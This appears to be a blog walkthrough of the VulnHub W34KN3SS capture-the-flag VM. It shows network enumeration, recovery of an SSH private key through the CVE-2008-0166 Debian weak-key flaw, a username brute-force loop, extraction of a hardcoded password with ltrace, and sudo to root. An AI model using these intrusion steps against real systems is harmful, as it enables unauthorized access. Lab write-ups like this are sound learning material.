<html>

<?php include '../header.php';?>

<body>

<?php include '../navbar.php';?>

    <div class="body-content">
        <h3>
            W34KN3SS (Weakness) &nbsp;&nbsp;&nbsp;&nbsp;  
        </h3>
        <img src="/img/pwn.png" alt="Hack the Planet" height="50px" width="50px" align="middle" align="left">
        <p class="text">
            I can't sing enough praises about W34KN3SS by askar <a href="https://twitter.com/mohammadaskar2">@mohammadaskar2</a>.  I thoroughly enjoyed it from enumeration to privilege escalation (and even learned something new during privesc).  Let's get started.
            <br><br>
            I began by downloading the torrent from Vulnhub here: <a href="https://www.vulnhub.com/entry/w34kn3ss-1,270/">https://www.vulnhub.com/entry/w34kn3ss-1,270/</a>.  After loading the VM in VMWare, adjusting the networking settings, and starting the VM, I looked for new hosts with an IP address on my current subnet using arp-scan.
        </p>
        <pre>
            root@kali:# arp-scan -l
            Interface: eth0, datalink type: EN10MB (Ethernet)
            Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
            192.168.0.116   00:0c:29:11:13:fb   VMware, Inc.
        </pre>
        <p class="text">
            After that, I decided to try out my new enumeration script.  After running the same first 10 commands when starting out on many of the boxes, I decided to automate it.  The script can be found here: <a href="https://github.com/caryhooper/scripts/blob/master/enum-automation.sh">enum-automation.sh</a>.  This script automates the nmap scan, checks for common services (right now just HTTP(S) and FTP), and initiates follow-on enumeration programs such as dirb and nikto.  
        </p>
        <pre>
            root@kali:# ./enum-automation.sh 192.168.0.116
            Initial Host Enumeration Script
            by Cary Hooper @nopantrootdance
            [!] Detected HTTP/HTTPS
            [!] Port 80 is a web service
            [!] Port 443 is a web service
                [*] Starting nikto against port 80
                [*] Starting dirb against port 80
                [*] Starting nikto against port 443
                [*] Starting dirb against port 443


            Program Complete
        </pre>
        <p class="text">
            Looking at the nmap scan, we see services running on three ports: 22, 80, and 443.
        </p>
        <pre>
            root@kali:# cat nmap/192.168.0.116.nmap 
            Nmap scan report for 192.168.0.116
            Host is up (0.00062s latency).
            Not shown: 65532 closed ports
            PORT    STATE SERVICE  VERSION
            22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
            80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
            443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
            MAC Address: 00:0C:29:11:13:FB (VMware)
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        </pre>
        <p class="text">
            So far, everything about this host seems like it's running Linux.  I see that an SSH service is running, so I'll be on the lookout for possible usernames, passwords, or private keys.  It's also interesting that two web services are running, presumably HTTP and HTTPS services.  Sometimes these are different, but often they host the same site (especially because here they are running on what appears to be the same Apache server).  Regardless of which content they host, I'll be looking at the HTTPS certificate to see if we can gain any information.  
        </p>
        <pre>
            root@kali:# echo | openssl s_client -showcerts -servername 192.168.0.116 -connect 192.168.0.116:443 2>/dev/null | openssl x509 -inform pem -noout -text | egrep "Issuer:|Subject:"
            Issuer: C = jo, ST = Jordan, L = Amman, O = weakness.jth, CN = weakness.jth, emailAddress = n30@weakness.jth
            Subject: C = jo, ST = Jordan, L = Amman, O = weakness.jth, CN = weakness.jth, emailAddress = n30@weakness.jth
            root@kali:# echo -e "jordan\namman\nn30\njamman\njordanamman" > users.txt
            root@kali:# echo '192.168.0.116  weakness.jth'>> /etc/hosts
            root@kali:# ./enum-automation.sh weakness.jth
            Initial Host Enumeration Script
            by Cary Hooper @nopantrootdance
            [!] Detected HTTP/HTTPS
            [!] Port 80 is a web service
            [!] Port 443 is a web service
                [*] Starting nikto against port 80
                [*] Starting dirb against port 80
                [*] Starting nikto against port 443
                [*] Starting dirb against port 443


            Program Complete
        </pre>
        <p class=text>
            Not only did we learn some possible usernames, but we also found what may be a hostname for the machine, weakness.jth.  To test this out, I added this entry to my /etc/hosts file and ran my enumation script again to see if there were any differences.  Immediately, I found that these sites were serving different content.
        </p>
        <pre>
            root@kali:# curl weakness.jth
            &lt;title&gt;Hmmmm ??&lt;/title&gt;

            &lt;br&gt;
            &lt;br&gt;
            &lt;br&gt;

             &lt;center&gt;&lt;h1&gt;keep following the white rabbit :D&lt;/h1&gt;&lt;/center&gt;

            &lt;pre&gt;
                     ,
                        /|      __
                       / |   ,-~ /
                      Y :|  //  /
                      | jj /( .^
                      >-"~"-v"
                     /       Y
                    jo  o    |
                   ( ~T~     j
                    >._-' _./
                   /   "~"  |
                  Y     _,  |
                 /| ;-"~ _  l
                / l/ ,-"~    \
                \//\/      .- \
                 Y        /    Y    -n30
                 l       I     !
                 ]\      _\    /"\
                (" ~----( ~   Y.  )
            ~~~~~~~~~~~~~~~~~~~~~~~~~
            &lt;/pre&gt;

        </pre>
        <p class=text>
            Great, thanks for the motivation Amman.  While looking at the rest of the enumeration files, we see that http://192.168.0.116/test/ is hosting a hint telling us that it's "it's all about keys :D" and that "We're going to need keys. Lots of Keys."  Enumerating further, I saw two files  tucked away in http://weakness.jth/private/files/.  The first, notes.txt, read "this key was generated by openssl 0.9.8c-1".  Another clue!  The other was a public key.
        </p>
        <pre>
            root@kali:# curl http://weakness.jth/private/files/mykey.pub
            ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
        </pre>
        <p class=text>
            I wasn't sure exactly what to do next, so I searched on google for "deriving public key into private key" and "spoof public key ssh", but got no hits.  Finally, I searched for weaknesses in openssl 0.9.8c-1 and found the following: <a href="https://www.exploit-db.com/exploits/5720">https://www.exploit-db.com/exploits/5720</a>.  I remembered exploiting this weakness elsewhere (I wonder if that's where Amman got it from?).  Its documented in CVE-2008-0166, which outlines a vulnerability in Debian-based operating systems' random number generators.  This resulted in predictable random numbers and allowed attackers to brute-force derived keys.  So we're going to brute force the RSA key. I download the repository of created keys (trading hard drive space for time here), search for this public key and see if was able to be brute-forced. 
        </p>
        <pre>
            root@kali:# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
            root@kali:# tar xvjf 5622.tar.bz2
            root@kali:# grep -r "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw==" .
            ./rsa/2048/4161de56829de2fe64b9055711f531c1-2537.pub:ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
        </pre>
        <p class=text>
            Great! Now we found a public/private key pair that match and may have a shell shortly.  Now, our only issue is that we don't know of a username.  No problem.  We can brute that...
        </p>
        <pre>
            root@kali:# cp ./rsa/2048/4161de56829de2fe64b9055711f531c1-2537 id_rsa
            root@kali:# chmod 400 id_rsa
            root@kali:# for i in $(cat users.txt); do ssh -o NumberOfPasswordPrompts=0 $i@192.168.0.121 -i id_rsa; done
            jordan@192.168.0.121: Permission denied (publickey,password).
            amman@192.168.0.121: Permission denied (publickey,password).
            Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

             * Documentation:  https://help.ubuntu.com
             * Management:     https://landscape.canonical.com
             * Support:        https://ubuntu.com/advantage

            Last login: Sat Aug  3 04:17:57 2019 from 192.168.0.117
            n30@W34KN3SS:~$ 
        </pre>
        <p class=text>
            And we're in!  Listing the home directory of n30, we see three things out of the ordinary: user.txt, .sudo_as_admin_successful, and code*.  Thus, we know that this user likely has sudo rights to escalate privilge to root (with <i>sudo su</i>), but we don't know the password.  
        </p>
        <pre>
            n30@W34KN3SS:~$ ll
            total 44
            drwxr-xr-x 5 n30  n30  4096 Aug 14  2018 ./
            drwxr-xr-x 3 root root 4096 May  5  2018 ../
            -rw------- 1 n30  n30    25 Aug 14  2018 .bash_history
            -rw-r--r-- 1 n30  n30   220 May  5  2018 .bash_logout
            -rw-r--r-- 1 n30  n30  3771 May  5  2018 .bashrc
            drwx------ 2 n30  n30  4096 May  5  2018 .cache/
            -rwxrwxr-x 1 n30  n30  1138 May  8  2018 code*
            drwxrwxr-x 3 n30  n30  4096 May  5  2018 .local/
            -rw-r--r-- 1 n30  n30   818 May  7  2018 .profile
            drwxrwxr-x 2 n30  n30  4096 May  5  2018 .ssh/
            -rw-r--r-- 1 n30  n30     0 May  5  2018 .sudo_as_admin_successful
            -rw-rw-r-- 1 n30  n30    33 May  8  2018 user.txt
            n30@W34KN3SS:~$ file code*
            code: python 2.7 byte-compiled
        </pre>
        <p class=text>
            After some basic linux enumeration and poking around for a few minutes, I decided to focus on the "code" file.  I ran the strings command on it, read the file with cat, and then ran the program, but to my surprise, recieved garbage back.  This was unexpected... I thought it was compiled python code. 
        </p>
        <pre>
            n30@W34KN3SS:~$ ./code
            ./code: line 1: $'\003\363\r': command not found
            ./code: line 2: $'^\307\361Zc\004@sX\002dd\001lZdd\001l\001Z\001dd\001l\002Z\002dd\001l\003Z\003d\002j\004e\002j\005\203\203\001GHd\003GHd\004GHd\005Z\006e\006e\ae\bd\006\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\006e\ae\bd\b\203\001\203\0017Z\006e\006e\ae\bd': command not found
            ./code: line 3: $'\203\001\203\0017Z\006e\006e\ae\bd\v\203\001\203\0017Z\006e\006e\ae\bd\f\203\001\203\0017Z\006e\006e\ae\bd\r\203\001\203\0017Z\006e\006e\ae\bd\016\203\001\203\0017Z\006e\006e\ae\bd\017\203\001\203\0017Z\006e\006e\ae\bd\020\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\020\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\003j': command not found
            ./code: line 4: syntax error near unexpected token `$'\025i\377\377\377\377Ns\032[+]System''
            ./code: line 4: `�Z
                               dje
                                  �GHdGHdS(i����Ns�[+]System Started at : {0}sG[+]This binary should generate unique hash for the hardcoded login infos[+]Generating the hash ..ttnt3t0t:tdtMtAtStDtNtBt!t#s[+]Your new hash is : {0}s[+]Done(
                    tostsocketttimethashlibtformattctimetinftchrtordtsha256t    hexdigestthashf(((scode.py&lt;module&gt;s&gt;
        </pre>
        <p class=text>
            I didn't know exactly how to run python byte code, but I figured it was a python versioning error.  I had seen some of these encoding/output issues before.  So I tried to run the byte code by explicitly invoking python2.  This seemed to work.
        </p>
        <pre>
            n30@W34KN3SS:~$ python2 code
            [+]System Started at : Sat Aug  3 04:27:53 2019
            [+]This binary should generate unique hash for the hardcoded login info
            [+]Generating the hash ..
            [+]Your new hash is : 794d4cb07d0dbbf61df0415ff4a8684ce2f8d04b663bd5893fb198e512a82354
            [+]Done
        </pre>
        <p class=text>
            So contextual clues indicate that some sort of hash is being generated for "hardcoded" login info.  I can only assume this is a hash of credentials for my current user, n30.  I attempted to crack this hash using hashcat, but could not.  There must be another way.  If the program is generating a hash and it is not being ran with higher privileges, then it must be contained within the program. But how can I access it?  I knew I'd need to start debugging the python bytecode.  There's probably a way to do this within python or gdb, however, I preferred to take a look with ltrace before I jumped off the deep end.  According to teh man page, ltrace is a "library call tracer". I learned about it and strace in one of the Over The Wire labs.  I ran ltrace on the program, then piped the output to a file so that it was more easily greppable.  At first, it looked like the output was too long, but on a whim, I grepped for n30.  At the bottom of the output, I found my answer.
        </p>
        <pre>
           n30@W34KN3SS:~$ ltrace python code >/dev/null 2> code.ltrace
           n30@W34KN3SS:~$ cat code.ltrace  | grep n30
           ... &lt;SNIP&gt; ...
           memcpy(0x7f77acc70734, "n30:dMASDNB!!#B!#!#33", 21) = 0x7f77acc70734
        </pre>
        <p class=text>
            This last line appeared to be a memcopy function just before the hash was returned at the end of the program.  I assumed it was the value that was hashed and salted.  To check, I attempted to list my sudo privileges with <i>sudo -l</i>.  As expected, the user n30 may use sudo for any command.  With that, I was root, had full control of the VM, and was able to read the root flag.  Great box Amman!  
        </p>
        <pre>
            n30@W34KN3SS:~$ sudo -l 
            [sudo] password for n30: 
            Matching Defaults entries for n30 on W34KN3SS:
                env_reset, mail_badpass,
                secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

            User n30 may run the following commands on W34KN3SS:
                (ALL : ALL) ALL
            n30@W34KN3SS:~$ sudo su
            root@W34KN3SS:/home/n30# id
            uid=0(root) gid=0(root) groups=0(root)
        </pre>
        <p class=text>

        </p>

        <br>
    </div>


</body>

<?php include '../footer.php';?>

</html>
